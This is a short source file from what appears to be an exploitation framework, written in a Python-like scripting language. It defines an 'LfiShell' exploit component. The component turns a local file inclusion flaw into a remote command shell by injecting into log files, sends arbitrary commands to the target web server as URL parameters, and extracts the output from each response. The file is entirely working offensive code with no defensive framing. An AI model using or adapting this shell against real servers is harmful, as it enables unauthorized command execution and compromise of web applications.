import('urllib');
import('urllib2');

class ExploitComponent LfiShell {
    shellInfo = null,

    __init__: @(
        url,
        next_url,
        next_data = null,
        dot = '.',
        separator = '/',
        terminator = '') {
        self.injector = LogInjector(
            url,
            next_url,
            next_data,
            dot,
            separator,
            terminator);
	},
    
    create: @{
        i = self.injector.inject();
        
        if (i == null) {
            self.log('[-] Could not exploit LFI');
            ret false;
        }
        
        self.shellInfo = i;
        
        ret true;
    },

    run: @(cmd) {
        if (self.shellInfo == null) {
            self.log('[!] No known shell');
            
            if (!self.create()) {
                ret null;
            }
		}
        
        u = self.createCmdUrl(cmd);
        self.log('[?] %s' % u);
        _, d = self.shellInfo;
        resp = urllib2.urlopen(u, d).read() |> self.parseResp;
        
        ret resp;
	},
    
    parseResp: @(resp) {
        e = self.injector.emitter;
        p = resp.split(e.prefix);
        if (len(p) < 2) ret resp;        
        p = p[1].split(e.suffix);        
        ret p[0];
    },

    createCmdUrl: @(cmd) {
        u, _ = self.shellInfo;
        d = urllib.urlencode({cmd: cmd});
		x = u.__contains__('?') ? '&' : '?';        
        ret u + x + d;
	},
};
